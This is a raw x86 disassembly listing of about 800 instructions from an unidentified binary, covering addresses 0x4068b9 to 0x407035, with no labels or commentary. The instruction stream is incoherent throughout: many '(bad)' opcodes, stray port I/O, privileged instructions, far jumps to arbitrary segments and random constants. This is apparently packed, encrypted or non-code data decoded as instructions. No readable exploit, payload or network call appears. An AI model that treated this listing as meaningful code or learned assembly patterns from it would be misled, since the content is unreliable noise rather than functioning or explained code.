  4068b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ba:	jae    0x4068f2
  4068bc:	and    BYTE PTR [ebp+0x4],0xdd
  4068c0:	mov    edx,0xd6d0f84b
  4068c5:	stos   BYTE PTR es:[edi],al
  4068c6:	test   BYTE PTR [ebx],bl
  4068c8:	sahf   
  4068c9:	cmp    esp,DWORD PTR [ebx]
  4068cb:	mov    dh,0x6e
  4068cd:	sti    
  4068ce:	out    0x90,al
  4068d0:	aaa    
  4068d1:	jno    0x406952
  4068d3:	(bad)  
  4068d4:	mov    dh,0x31
  4068d6:	test   BYTE PTR [edi+0x52],bl
  4068d9:	mov    edi,0x30caa592
  4068de:	pop    ebx
  4068df:	icebp  
  4068e0:	xor    al,0x1f
  4068e2:	into   
  4068e3:	pusha  
  4068e4:	mul    dh
  4068e6:	stos   DWORD PTR es:[edi],eax
  4068e7:	outs   dx,DWORD PTR cs:[esi]
  4068e9:	xor    dl,ch
  4068eb:	les    ebp,FWORD PTR [edi+esi*4-0x20e2f53a]
  4068f2:	pop    ds
  4068f3:	mov    bh,0x8
  4068f5:	(bad)  
  4068f6:	imul   esi,DWORD PTR [ebp-0x95ea2c5],0x55
  4068fd:	ja     0x406927
  4068ff:	ins    BYTE PTR es:[edi],dx
  406900:	loopne 0x4068ee
  406902:	imul   ecx,DWORD PTR [edx+0x4e97e359],0x890623b9
  40690c:	mov    edx,0x99860bef
  406911:	data16 jl 0x406915
  406914:	pop    eax
  406915:	dec    esp
  406916:	add    cl,BYTE PTR [esi-0x59]
  406919:	add    BYTE PTR [edx+0x23f08121],0xd9
  406920:	adc    dl,dl
  406922:	or     ebp,0x1a81dbd2
  406928:	pop    esp
  406929:	add    DWORD PTR [esi-0x5bf11eff],edi
  40692f:	push   esi
  406930:	out    0x1b,eax
  406932:	hlt    
  406933:	mov    dl,0xa6
  406935:	xor    DWORD PTR [edi-0x5b59802e],edx
  40693b:	sbb    al,bh
  40693d:	jo     0x4068ed
  40693f:	icebp  
  406940:	retf   
  406941:	stos   BYTE PTR es:[edi],al
  406942:	sub    BYTE PTR [ecx+0x44],dh
  406945:	pusha  
  406946:	pop    esi
  406947:	sbb    DWORD PTR ds:0xf5753673,eax
  40694d:	push   edi
  40694e:	repz (bad) 
  406950:	cmp    al,0xf5
  406952:	sub    eax,0xacaaa110
  406957:	jnp    0x40692a
  406959:	xchg   ebp,eax
  40695a:	sub    al,0x1c
  40695c:	arpl   WORD PTR [ebx+edx*8],bp
  40695f:	xchg   esi,eax
  406960:	bound  esi,QWORD PTR [eax-0x66857b5e]
  406966:	push   esi
  406967:	or     DWORD PTR [ebx+0x6c],edx
  40696a:	sub    BYTE PTR [eax+0x599f194b],ch
  406970:	adc    DWORD PTR ds:0x57b0ea7f,ebx
  406976:	mov    ch,0x78
  406978:	xchg   ebp,eax
  406979:	jecxz  0x406940
  40697b:	adc    bl,ch
  40697d:	cmp    edi,DWORD PTR [edi+0x26]
  406980:	(bad)  
  406983:	in     al,0x4d
  406985:	mov    ds:0xa4f9cc07,eax
  40698a:	cmc    
  40698b:	sahf   
  40698c:	xchg   esp,eax
  40698d:	xor    BYTE PTR [edi-0xf],bh
  406990:	call   0xa08f:0xbf8bfc41
  406997:	cdq    
  406998:	and    BYTE PTR [edx+0x3],cl
  40699b:	gs add al,0x38
  40699e:	cli    
  40699f:	jae    0x4069ef
  4069a1:	mov    ah,0xad
  4069a3:	cmp    al,0x5b
  4069a5:	dec    edi
  4069a6:	dec    ecx
  4069a7:	imul   esi,DWORD PTR [eax+0x366c5b66],0xbf37bcdd
  4069b1:	mov    eax,0x5341dd08
  4069b6:	sub    ch,ah
  4069b8:	add    eax,0x60db74cc
  4069bd:	mov    esi,0x79a92c75
  4069c2:	daa    
  4069c3:	js     0x40699a
  4069c5:	cmp    DWORD PTR gs:[edx],edx
  4069c8:	ds jg  0x406a1b
  4069cb:	mov    bh,BYTE PTR [ebp+0x50]
  4069ce:	dec    ebp
  4069cf:	stos   BYTE PTR es:[edi],al
  4069d0:	dec    eax
  4069d1:	adc    ebp,esp
  4069d3:	(bad)  
  4069d4:	(bad)  
  4069d5:	pop    ecx
  4069d6:	shl    BYTE PTR [eax],0x88
  4069d9:	xor    al,0xb7
  4069db:	mov    edi,0xc433db5f
  4069e0:	psrld  mm7,QWORD PTR [ebx+0x45e73b4a]
  4069e7:	jg     0x4069c1
  4069e9:	repz aam 0xee
  4069ec:	fwait
  4069ed:	enter  0xe71d,0xdf
  4069f1:	inc    esi
  4069f2:	test   eax,edi
  4069f4:	lea    edx,[edi]
  4069f6:	cmc    
  4069f7:	sub    ch,bh
  4069f9:	add    esi,edi
  4069fb:	imul   edi,ebp,0x61
  4069fe:	dec    eax
  4069ff:	pop    es
  406a00:	icebp  
  406a01:	in     al,dx
  406a02:	out    dx,al
  406a03:	in     al,dx
  406a04:	mov    esp,0xe75494c3
  406a09:	lahf   
  406a0a:	retf   0xecfe
  406a0d:	aam    0x61
  406a0f:	loopne 0x406a06
  406a11:	lods   al,BYTE PTR ds:[esi]
  406a12:	mov    eax,DWORD PTR [edi+ebx*1+0x20]
  406a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a17:	pop    ds
  406a18:	adc    ebx,DWORD PTR [ecx+eax*4+0x3]
  406a1c:	loopne 0x4069d3
  406a1e:	ror    BYTE PTR [ebx-0x2d],0x25
  406a22:	arpl   WORD PTR [esi],di
  406a24:	stc    
  406a25:	cmp    DWORD PTR [ebx],ebp
  406a27:	fiadd  DWORD PTR [edx-0x87345f]
  406a2d:	fcom   QWORD PTR [ecx+0x5b]
  406a30:	mov    eax,0xbe9883f0
  406a35:	(bad)  
  406a36:	(bad)  
  406a37:	test   eax,0xd2ae317b
  406a3c:	es jle 0x406a73
  406a3f:	inc    esi
  406a40:	dec    edi
  406a41:	add    al,0x1
  406a43:	jp     0x406a92
  406a45:	test   BYTE PTR [esi],bl
  406a47:	aad    0x8d
  406a49:	push   ebp
  406a4a:	pop    edi
  406a4b:	int    0x63
  406a4d:	dec    edi
  406a4e:	aam    0x41
  406a50:	jb     0x406ab3
  406a52:	scas   al,BYTE PTR es:[edi]
  406a53:	sub    BYTE PTR [ecx],0x29
  406a56:	sbb    al,0xd3
  406a58:	jo     0x406a5e
  406a5a:	in     al,dx
  406a5b:	retf   0x64
  406a5e:	xor    ebx,ebp
  406a60:	int    0x2c
  406a62:	mov    al,0x9d
  406a64:	pop    esp
  406a65:	mov    ds:0x86a2cc43,eax
  406a6a:	push   esi
  406a6b:	pop    es
  406a6c:	ss or  eax,0xb277f02a
  406a72:	inc    edx
  406a73:	fidiv  DWORD PTR [eax-0x25ea6a39]
  406a79:	xchg   ebx,eax
  406a7a:	ror    DWORD PTR [esi-0x39],0xcf
  406a7e:	rol    dl,1
  406a80:	push   ds
  406a81:	ss loop 0x406a61
  406a84:	pop    ebx
  406a85:	ja     0x406a37
  406a87:	fsub   DWORD PTR [edx]
  406a89:	adc    BYTE PTR [eax-0x40],cl
  406a8c:	push   0xffffffa6
  406a8e:	popa   
  406a8f:	inc    ebp
  406a90:	iret   
  406a91:	cmp    BYTE PTR [ebx+0x1d],bl
  406a94:	and    bl,0x27
  406a97:	imul   esp,DWORD PTR [edi+0x8b3e52e],0xdd43d80b
  406aa1:	adc    cl,BYTE PTR [ebp+0x3d7dbcdc]
  406aa7:	xchg   esi,eax
  406aa8:	jbe    0x406a47
  406aaa:	shl    DWORD PTR ds:0x1b2a9be3,cl
  406ab0:	in     al,0x10
  406ab2:	push   edx
  406ab3:	dec    edx
  406ab4:	es inc edx
  406ab6:	in     al,0x7d
  406ab8:	adc    edx,DWORD PTR [esi-0x62]
  406abb:	ret    
  406abc:	xchg   edi,eax
  406abd:	popf   
  406abe:	adc    eax,DWORD PTR [edx+0x7e]
  406ac1:	fmul   st(4),st
  406ac3:	adc    DWORD PTR [ecx-0x1b],0xe
  406ac7:	jge    0x406a94
  406ac9:	popf   
  406aca:	push   edx
  406acb:	js     0x406b1c
  406acd:	test   DWORD PTR [ecx],edi
  406acf:	cwde   
  406ad0:	cmc    
  406ad1:	adc    bh,BYTE PTR [edi+0x71]
  406ad4:	lock dec eax
  406ad6:	inc    ecx
  406ad7:	jmp    0x406a90
  406ad9:	mov    ds:0x47fecf21,eax
  406ade:	pop    ss
  406adf:	stos   DWORD PTR es:[edi],eax
  406ae0:	inc    ebp
  406ae1:	jns    0x406b4a
  406ae3:	mov    al,0x76
  406ae5:	das    
  406ae6:	inc    ebx
  406ae7:	popa   
  406ae8:	icebp  
  406ae9:	dec    ebp
  406aea:	into   
  406aeb:	xor    eax,0x9ed48700
  406af0:	stc    
  406af1:	stos   BYTE PTR es:[edi],al
  406af2:	inc    ecx
  406af3:	sub    eax,0xa5f19747
  406af8:	push   esi
  406af9:	cli    
  406afa:	mov    al,0x82
  406afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406afd:	daa    
  406afe:	es dec edx
  406b00:	fild   QWORD PTR [ecx]
  406b02:	pop    ds
  406b03:	xchg   esi,eax
  406b04:	stos   DWORD PTR es:[edi],eax
  406b05:	sahf   
  406b06:	xchg   BYTE PTR [edi+0x61],bl
  406b09:	pop    eax
  406b0a:	jae    0x406b48
  406b0c:	sub    eax,0xd60f9f94
  406b11:	ja     0x406aba
  406b13:	out    0x30,eax
  406b15:	rep lods eax,DWORD PTR ds:[esi]
  406b17:	mov    esp,0x8cc9aa59
  406b1c:	mov    ebp,0x3fdfdfce
  406b21:	(bad)  
  406b22:	aaa    
  406b23:	jmp    0x406ae1
  406b25:	push   ebp
  406b26:	pop    ebx
  406b27:	(bad)
  406b2a:	out    dx,eax
  406b2b:	mov    ch,0x5f
  406b2d:	xor    eax,0x4189a4f7
  406b32:	cmp    edx,DWORD PTR ds:0xeac7be40
  406b38:	test   cl,bh
  406b3a:	adc    BYTE PTR [esi+0xd6657ff],ch
  406b40:	ss mov edx,0x7d246fdb
  406b46:	repz (bad)
  406b49:	pop    ecx
  406b4a:	adc    esp,DWORD PTR [ebx-0x42b92312]
  406b50:	(bad)  [ebx]
  406b52:	fisttp WORD PTR [ecx]
  406b54:	add    ebx,DWORD PTR [esi+0x64ac6a9]
  406b5a:	and    dl,cl
  406b5c:	jne    0x406b6c
  406b5e:	sub    DWORD PTR [edi-0x57],0xffffff9e
  406b62:	push   0x22
  406b64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b65:	inc    edx
  406b66:	retf   0x191
  406b69:	lods   eax,DWORD PTR ds:[esi]
  406b6a:	leave  
  406b6b:	js     0x406b97
  406b6d:	mov    ds:0x1b399932,al
  406b72:	mov    ds:0x3e1e574a,eax
  406b77:	or     BYTE PTR [ebx],dl
  406b79:	dec    eax
  406b7a:	cmp    eax,0x2dfd2431
  406b7f:	or     DWORD PTR [edi-0x791c0a74],edx
  406b85:	cli    
  406b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b87:	xchg   esi,eax
  406b88:	mov    ah,BYTE PTR [ecx+0x7e]
  406b8b:	mov    eax,ds:0xd7f8aef4
  406b90:	xor    DWORD PTR [esi-0xf],0x1a70714a
  406b97:	test   al,ch
  406b99:	mov    ecx,0x75718080
  406b9e:	xor    bl,BYTE PTR [ecx-0x21ae6b4b]
  406ba4:	adc    al,0xa0
  406ba6:	lods   eax,DWORD PTR ds:[esi]
  406ba7:	daa    
  406ba8:	adc    bl,ch
  406baa:	push   ecx
  406bab:	mov    ?,esi
  406bad:	or     DWORD PTR [ebx],edx
  406baf:	retf   0x577f
  406bb2:	leave  
  406bb3:	pop    ds
  406bb4:	int3   
  406bb5:	(bad)  [ecx+0x13879b67]
  406bbb:	cdq    
  406bbc:	pop    ss
  406bbd:	push   ecx
  406bbe:	or     DWORD PTR [ecx-0x6c79735],esi
  406bc4:	inc    ebp
  406bc5:	or     bh,al
  406bc7:	adc    ch,al
  406bc9:	loopne 0x406c39
  406bcb:	fs xchg esp,eax
  406bcd:	outs   dx,BYTE PTR ds:[esi]
  406bce:	scas   eax,DWORD PTR es:[edi]
  406bcf:	lea    esi,[ebx+ebx*8+0x42]
  406bd3:	cmp    DWORD PTR [ebp+edx*4+0xc],edx
  406bd7:	add    BYTE PTR [eax+0x7c5130cb],al
  406bdd:	push   edi
  406bde:	cmp    al,0xbf
  406be0:	mov    esp,0x7cb21ed8
  406be5:	xor    ah,BYTE PTR [eax+edx*2+0x544da01f]
  406bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bed:	fdivr  QWORD PTR [ebx-0x7f]
  406bf0:	jo     0x406bac
  406bf2:	adc    ebp,0x9af317f6
  406bf8:	in     eax,dx
  406bf9:	and    al,0x64
  406bfb:	enter  0x5c4f,0xef
  406bff:	pop    ebx
  406c00:	cdq    
  406c01:	dec    ebx
  406c02:	pop    edi
  406c03:	(bad)  
  406c04:	xor    ch,BYTE PTR [ebx-0x41]
  406c07:	cmp    al,0xd1
  406c09:	stos   DWORD PTR es:[edi],eax
  406c0a:	aaa    
  406c0b:	sahf   
  406c0c:	add    al,0xe1
  406c0e:	fldcw  WORD PTR [eax+0x75c4f844]
  406c14:	add    BYTE PTR [esi+0x3fccca12],al
  406c1a:	inc    edi
  406c1b:	pop    ds
  406c1c:	jnp    0x406bb4
  406c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1f:	into   
  406c20:	mov    ah,0x73
  406c22:	pop    edi
  406c23:	mov    ebp,DWORD PTR [eax]
  406c25:	pop    edx
  406c26:	movntps XMMWORD PTR [edx],xmm4
  406c29:	fs inc esi
  406c2b:	mov    BYTE PTR [esi-0x5d],ch
  406c2e:	xor    al,0x55
  406c30:	mov    eax,ds:0x75375d3a
  406c35:	dec    ebx
  406c36:	ins    BYTE PTR es:[edi],dx
  406c37:	adc    al,0x9f
  406c39:	test   al,0x42
  406c3b:	popf   
  406c3c:	sbb    al,0x15
  406c3e:	mov    al,ds:0xb30203e6
  406c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c44:	in     al,dx
  406c45:	mov    cs,WORD PTR [edx-0x53]
  406c48:	sub    bh,BYTE PTR [ebx]
  406c4a:	bound  esp,QWORD PTR [ebp-0x77a4344]
  406c50:	cwde   
  406c51:	bound  esi,QWORD PTR [ebx+0x1fec1f0e]
  406c57:	sub    ecx,DWORD PTR [edx]
  406c59:	mov    al,0x20
  406c5b:	outs   dx,BYTE PTR ds:[esi]
  406c5c:	dec    esp
  406c5d:	dec    edi
  406c5e:	xor    al,0xdb
  406c60:	mov    DWORD PTR [esi-0x6c5cc687],esp
  406c66:	xchg   edi,eax
  406c67:	mov    eax,0x624049ee
  406c6c:	fwait
  406c6d:	xor    eax,0xeca4cbe0
  406c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c73:	mov    ds:0x9f05e0ba,al
  406c78:	or     al,0xfe
  406c7a:	clc    
  406c7b:	cmp    BYTE PTR [edx],cl
  406c7d:	mov    bh,0xf2
  406c7f:	mov    bh,0xab
  406c81:	jno    0x406c92
  406c83:	xchg   ebp,eax
  406c84:	sub    edi,DWORD PTR [edx+edi*8]
  406c87:	push   es
  406c88:	mov    dh,0xc3
  406c8a:	pop    ss
  406c8b:	xchg   DWORD PTR [ebx],esp
  406c8d:	mov    bl,0x23
  406c8f:	dec    ebp
  406c90:	rol    BYTE PTR [edx+eiz*1+0x473d146c],1
  406c97:	pop    esi
  406c98:	or     BYTE PTR [edx+0x31],cl
  406c9b:	lahf   
  406c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c9d:	inc    edi
  406c9e:	jae    0x406ce1
  406ca0:	sar    ch,1
  406ca2:	ret    
  406ca3:	stos   DWORD PTR es:[edi],eax
  406ca4:	inc    ebx
  406ca5:	dec    ebx
  406ca6:	loopne 0x406d01
  406ca8:	push   ecx
  406ca9:	test   al,0xb9
  406cab:	daa    
  406cac:	mov    bh,BYTE PTR [eax-0x47]
  406caf:	addps  xmm7,XMMWORD PTR [esi-0x17]
  406cb3:	xchg   esi,eax
  406cb4:	jns    0x406c93
  406cb6:	inc    ebp
  406cb7:	sub    eax,0x64c533f5
  406cbc:	ret    
  406cbd:	dec    ebx
  406cbe:	dec    eax
  406cbf:	aam    0xd9
  406cc1:	mov    esi,0xde355edc
  406cc6:	mov    ds:0x39f54679,eax
  406ccb:	or     DWORD PTR [ecx],ebp
  406ccd:	mov    dl,0x7b
  406ccf:	sub    DWORD PTR [edx-0x3b0c712f],edx
  406cd5:	and    BYTE PTR [esi+0x25],dl
  406cd8:	mov    DWORD PTR [edi-0x46],ecx
  406cdb:	sub    al,0x75
  406cdd:	mov    cl,0x38
  406cdf:	cmc    
  406ce0:	retf   0xaf3e
  406ce3:	stos   BYTE PTR es:[edi],al
  406ce4:	inc    ecx
  406ce5:	and    esi,ebx
  406ce7:	inc    ebx
  406ce8:	fs loopne 0x406d4c
  406ceb:	jae    0x406c8c
  406ced:	jmp    0x204d:0x1b7ffa45
  406cf4:	retf   0x36b
  406cf7:	and    edx,DWORD PTR [ebp-0x79867058]
  406cfd:	jnp    0x406cbd
  406cff:	mov    dl,0xd3
  406d01:	retf   
  406d02:	test   eax,0x426dd743
  406d07:	inc    eax
  406d08:	test   eax,0xb7915826
  406d0d:	aam    0x6c
  406d0f:	mov    ebp,0x4205e07e
  406d14:	sahf   
  406d15:	mov    ecx,0x37ab0de5
  406d1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d1b:	stc    
  406d1c:	fwait
  406d1d:	add    ch,BYTE PTR [ebx+0x37]
  406d20:	mov    ds:0x856c0480,al
  406d25:	xchg   edx,eax
  406d26:	push   esp
  406d27:	cmp    DWORD PTR [ebp-0x6b],ebp
  406d2a:	pop    edx
  406d2b:	cmp    eax,0x3b6c5324
  406d30:	into   
  406d31:	inc    ecx
  406d32:	ins    BYTE PTR es:[edi],dx
  406d33:	xor    cl,BYTE PTR [edx]
  406d35:	(bad)  ds:0x8c03e80
  406d3b:	bound  eax,QWORD PTR [esi+edx*8-0x2d932a8f]
  406d42:	add    al,0x9b
  406d44:	or     ch,bh
  406d46:	cmp    esi,DWORD PTR [edi+0x45370c71]
  406d4c:	cwde   
  406d4d:	fistp  QWORD PTR [edx-0x47]
  406d50:	mov    edi,0x56104f37
  406d55:	sub    bh,dl
  406d57:	xor    BYTE PTR [ebx],dl
  406d59:	aad    0x92
  406d5b:	iret   
  406d5c:	pop    ebp
  406d5d:	jnp    0x406ce5
  406d5f:	mov    edx,0x918acbaf
  406d64:	jnp    0x406d02
  406d66:	arpl   WORD PTR [esi+0x2b],bp
  406d69:	add    BYTE PTR [eax-0x4a634db4],bl
  406d6f:	mov    al,0x3a
  406d71:	ss adc dl,0x85
  406d75:	outs   dx,BYTE PTR ds:[esi]
  406d76:	xor    DWORD PTR [eax+0x4bb9c286],ecx
  406d7c:	mov    dh,0x21
  406d7e:	adc    DWORD PTR [ebx-0x2283210d],ebx
  406d84:	sbb    BYTE PTR [edx-0x38cfd115],al
  406d8a:	lods   al,BYTE PTR ds:[esi]
  406d8b:	push   ds
  406d8c:	xor    ebx,DWORD PTR ds:[eax-0xe]
  406d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d91:	mov    al,ds:0xe9c89437
  406d96:	sub    al,0xb6
  406d98:	in     eax,0xe0
  406d9a:	dec    esi
  406d9b:	call   0x9e3cc873
  406da0:	das    
  406da1:	cli    
  406da2:	mov    al,BYTE PTR [edx]
  406da4:	and    al,0x5
  406da6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406da7:	cmp    DWORD PTR [eax+0x41],esp
  406daa:	out    0x9a,al
  406dac:	and    ecx,DWORD PTR [edx+edi*2]
  406daf:	push   edi
  406db0:	mov    DWORD PTR [ecx+ebx*2],0x35b60faa
  406db7:	(bad)  
  406db8:	mov    eax,0x1b7a2fd7
  406dbd:	xchg   ebx,eax
  406dbe:	out    dx,eax
  406dbf:	dec    ebx
  406dc0:	(bad)  
  406dc1:	loope  0x406df0
  406dc3:	fisttp WORD PTR [esi+0x65]
  406dc6:	ins    BYTE PTR es:[edi],dx
  406dc7:	call   FWORD PTR [esi]
  406dc9:	mov    ds:0xe83eb741,al
  406dce:	les    ebx,FWORD PTR [esi+0x63]
  406dd1:	dec    eax
  406dd2:	cli    
  406dd3:	add    cl,BYTE PTR [ebx+0x19]
  406dd6:	adc    eax,0x4e207a7
  406ddb:	adc    BYTE PTR [edi-0x390d81d8],0xab
  406de2:	js     0x406d87
  406de4:	cld    
  406de5:	inc    edx
  406de6:	sub    DWORD PTR [edx],ecx
  406de8:	clc    
  406de9:	inc    esi
  406dea:	sbb    ah,BYTE PTR [ebp+edi*8+0x1f]
  406dee:	jle    0x406d87
  406df0:	mov    ebx,0x6b3cc43e
  406df5:	xor    DWORD PTR [edi],0x1f
  406df8:	adc    ecx,DWORD PTR [edi-0x49c7caa6]
  406dfe:	push   0x59
  406e00:	loop   0x406e63
  406e02:	push   cs
  406e03:	lea    ecx,[edi+edi*1+0x4a]
  406e07:	dec    edi
  406e08:	jns    0x406dac
  406e0a:	jmp    0x79d2df58
  406e0f:	addr16 fs jmp 0x99e9:0x8610f81b
  406e18:	xor    edx,DWORD PTR ds:0xc7c7f559
  406e1e:	mov    esp,0x67753415
  406e23:	sub    eax,0xb6814c56
  406e28:	inc    ebx
  406e29:	adc    eax,0x4db89767
  406e2e:	sbb    DWORD PTR [edi],esp
  406e30:	mov    ds:0x68833842,eax
  406e35:	xor    al,0x49
  406e37:	cmp    eax,0xc7acb019
  406e3c:	(bad)  
  406e3d:	outs   dx,BYTE PTR ds:[esi]
  406e3e:	xor    DWORD PTR [ecx-0x62115c8d],esp
  406e44:	pop    es
  406e45:	(bad)  
  406e46:	hlt    
  406e47:	sti    
  406e48:	push   esp
  406e49:	pop    ebx
  406e4a:	pop    esi
  406e4b:	and    ah,dh
  406e4d:	fwait
  406e4e:	imul   BYTE PTR [ecx-0x7b6f8e7f]
  406e54:	in     eax,dx
  406e55:	jl     0x406e65
  406e57:	mov    bl,0xad
  406e59:	les    ebp,FWORD PTR [eax]
  406e5b:	push   es
  406e5c:	mov    bh,0x4c
  406e5e:	mov    al,0x7e
  406e60:	mov    dh,0x71
  406e62:	cmp    DWORD PTR [edx+ecx*2],esi
  406e65:	adc    DWORD PTR [ecx-0xd],eax
  406e68:	sbb    ah,ch
  406e6a:	(bad)  
  406e6b:	fmulp  st(0),st
  406e6d:	jo     0x406ec6
  406e6f:	neg    dl
  406e71:	jge    0x406e3f
  406e73:	int3   
  406e74:	jae    0x406e62
  406e76:	xor    cl,bh
  406e78:	sub    BYTE PTR [eax+0x8],ah
  406e7b:	jge    0x406e21
  406e7d:	(bad)  
  406e7e:	jmp    0x5bfe:0x6831d0ee
  406e85:	cmc    
  406e86:	mov    al,ds:0xecdc443
  406e8b:	nop
  406e8c:	dec    ecx
  406e8d:	mov    ch,0x4d
  406e8f:	iret   
  406e90:	push   ecx
  406e91:	xor    DWORD PTR [esi-0xd],ebp
  406e94:	fcomp  QWORD PTR [esi-0x7a]
  406e97:	dec    ecx
  406e98:	push   ecx
  406e99:	dec    ebx
  406e9a:	nop
  406e9b:	jg     0x406e75
  406e9d:	dec    esi
  406e9e:	or     BYTE PTR [esi],bl
  406ea0:	sbb    ch,BYTE PTR [ecx+ecx*8]
  406ea3:	outs   dx,BYTE PTR ds:[esi]
  406ea4:	inc    ch
  406ea6:	push   ecx
  406ea7:	add    BYTE PTR [edi+0x440eab65],bl
  406ead:	mov    esi,0x92c7430
  406eb2:	xchg   BYTE PTR [esi],ch
  406eb4:	fs inc edx
  406eb6:	ins    DWORD PTR es:[edi],dx
  406eb7:	inc    edi
  406eb8:	mov    fs,WORD PTR [edi-0x2668c856]
  406ebe:	cld    
  406ebf:	push   ebx
  406ec0:	adc    BYTE PTR [ebx-0x206c4bfe],cl
  406ec6:	mov    dh,0x38
  406ec8:	loop   0x406e80
  406eca:	aas    
  406ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ecc:	sub    DWORD PTR [ebx-0x7d],edi
  406ecf:	jmp    DWORD PTR [ebp+0x11]
  406ed2:	outs   dx,BYTE PTR ds:[esi]
  406ed3:	ja     0x406ef0
  406ed5:	cmp    bh,ah
  406ed7:	sub    esp,0x39
  406eda:	icebp  
  406edb:	mov    ch,0x44
  406edd:	fdiv   QWORD PTR ds:0x74d7f016
  406ee3:	jbe    0x406ed3
  406ee5:	or     BYTE PTR [edi-0x4b],bh
  406ee8:	add    bh,BYTE PTR [eax]
  406eea:	adc    BYTE PTR [eax+edx*1-0x47],bh
  406eee:	call   0xf19a:0xe3bfc5b0
  406ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ef6:	push   ecx
  406ef7:	inc    edi
  406ef8:	add    edx,esp
  406efa:	mov    gs,ebx
  406efc:	inc    edi
  406efd:	(bad)
  406f01:	sub    ah,BYTE PTR [ebx-0x3c]
  406f04:	loopne 0x406f55
  406f06:	mov    ds:0x83b700dd,eax
  406f0b:	ret    0x85e8
  406f0e:	dec    ecx
  406f0f:	js     0x406f10
  406f11:	jp     0x406ed3
  406f13:	outs   dx,BYTE PTR ds:[esi]
  406f14:	inc    esi
  406f15:	daa    
  406f16:	and    al,0x42
  406f18:	sub    eax,0xe1e3d6c7
  406f1d:	push   ebx
  406f1e:	bound  esi,QWORD PTR [edx]
  406f20:	xor    DWORD PTR [ebp-0x73a76f69],ebx
  406f26:	mov    cl,0xaf
  406f28:	js     0x406f06
  406f2a:	xor    BYTE PTR [esi+edx*1],dl
  406f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f2e:	adc    al,0x63
  406f30:	adc    BYTE PTR [edx+0x10],dl
  406f33:	sub    esp,eax
  406f35:	jecxz  0x406f17
  406f37:	js     0x406f20
  406f39:	imul   esi,edx,0x61
  406f3c:	ss jae 0x406f94
  406f3f:	sbb    esi,DWORD PTR [edx+0x73121069]
  406f45:	in     al,dx
  406f46:	lods   eax,DWORD PTR ds:[esi]
  406f47:	xor    ah,BYTE PTR [ebp+0x6fe7e634]
  406f4d:	ret    
  406f4e:	(bad)  
  406f4f:	fsubr  QWORD PTR [eax-0x4b]
  406f52:	and    esp,esi
  406f54:	cmp    dh,0x8c
  406f57:	ja     0x406f51
  406f59:	xchg   esp,eax
  406f5a:	sahf   
  406f5b:	addr16 mov bl,0x3c
  406f5e:	call   0x9f6f15bc
  406f63:	stos   BYTE PTR es:[edi],al
  406f64:	ins    BYTE PTR es:[edi],dx
  406f65:	mov    edi,DWORD PTR [ecx+0x6b]
  406f68:	jl     0x406f15
  406f6a:	or     DWORD PTR ds:0x564fb6d7,ecx
  406f70:	mov    ebp,0xe38c9b72
  406f75:	inc    eax
  406f76:	lea    ebx,[edx]
  406f78:	jb     0x406f04
  406f7a:	(bad)  
  406f7b:	and    BYTE PTR [esi-0x762d64a7],dl
  406f81:	int3   
  406f82:	adc    DWORD PTR [eax+0x4],esp
  406f85:	mov    edx,0xbf2737cc
  406f8a:	hlt    
  406f8b:	bound  edi,QWORD PTR [ebp+0x733a8ab3]
  406f91:	mul    DWORD PTR [esp+edx*4]
  406f94:	lahf   
  406f95:	je     0x406f80
  406f97:	imul   BYTE PTR ds:[esi+0x6b960289]
  406f9e:	xchg   edi,eax
  406f9f:	add    bl,al
  406fa1:	mov    WORD PTR [esi-0x5f],fs
  406fa4:	or     sp,WORD PTR [eax+edx*2+0x71]
  406fa9:	jne    0x406f62
  406fab:	add    DWORD PTR [esp+eax*1+0x7c85b71],ebp
  406fb2:	jns    0x406f5d
  406fb4:	cld    
  406fb5:	inc    esp
  406fb6:	mov    ebp,0xb7bd551a
  406fbb:	test   BYTE PTR gs:[ecx],dl
  406fbe:	cwde   
  406fbf:	enter  0x2f60,0x7a
  406fc3:	cs ret 
  406fc5:	inc    ebp
  406fc6:	mov    al,BYTE PTR [esi+0x50]
  406fc9:	arpl   WORD PTR [eax-0x2d],sp
  406fcc:	sub    BYTE PTR [esi+0x5e4e58d5],al
  406fd2:	dec    eax
  406fd3:	int    0xab
  406fd5:	(bad)  
  406fd7:	ret    0xe210
  406fda:	jle    0x406fc5
  406fdc:	std    
  406fdd:	dec    edx
  406fde:	sbb    bl,cl
  406fe0:	adc    ebp,DWORD PTR [edx-0x3bb5afa0]
  406fe6:	inc    eax
  406fe7:	or     eax,edx
  406fe9:	in     eax,dx
  406fea:	adc    esi,ecx
  406fec:	sbb    DWORD PTR [eax],0xffffffb1
  406fef:	dec    edi
  406ff0:	lock pop esp
  406ff2:	jge    0x407031
  406ff4:	fdivr  DWORD PTR [edi+0x32]
  406ff7:	xchg   al,bl
  406ff9:	cwde   
  406ffa:	mov    WORD PTR [esi+0x68],ss
  406ffd:	or     edx,DWORD PTR [ecx+0x33b060f4]
  407003:	scas   al,BYTE PTR es:[edi]
  407004:	mov    ch,0xd1
  407006:	sbb    BYTE PTR [edx],bl
  407008:	loope  0x406ff9
  40700a:	xor    edx,DWORD PTR ds:[edx+0x9923ac1]
  407011:	mov    cs,WORD PTR [ecx+0x4c289e41]
  407017:	and    eax,0x7ba3716
  40701c:	out    0x4a,al
  40701e:	arpl   WORD PTR [ecx+0x65214d43],bx
  407024:	jl     0x407015
  407026:	cmp    cl,ch
  407028:	jge    0x406fde
  40702a:	scas   al,BYTE PTR es:[edi]
  40702b:	out    dx,al
  40702c:	mov    ah,0xf3
  40702e:	mov    DWORD PTR ds:[eax+0x2b],ebp
  407032:	inc    ebp
  407033:	cmp    al,0x7e
  407035:	fsub   QWORD PTR [edi-0x17467554]
